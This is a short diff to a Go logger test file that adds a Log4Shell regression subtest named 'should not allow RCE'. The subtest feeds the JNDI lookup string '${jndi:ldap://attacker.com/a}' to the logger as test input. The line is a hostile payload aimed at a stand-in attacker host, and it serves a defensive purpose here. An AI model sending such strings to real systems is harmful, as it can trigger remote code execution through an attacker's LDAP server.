@@ -91,6 +91,11 @@ func TestLogger(t *testing.T) {
 		testLogDefaultLevels("nice true 10", "nice", true, 10)
 	})
 
+	// test log4shell
+	t.Run("should not allow RCE", func(t *testing.T) {
+		testLogDefaultLevels("${jndi:ldap://attacker.com/a}", "${jndi:ldap://attacker.com/a}")
+	})
+
 	// TODO: custom level
 	// TODO: error/fatal
 }
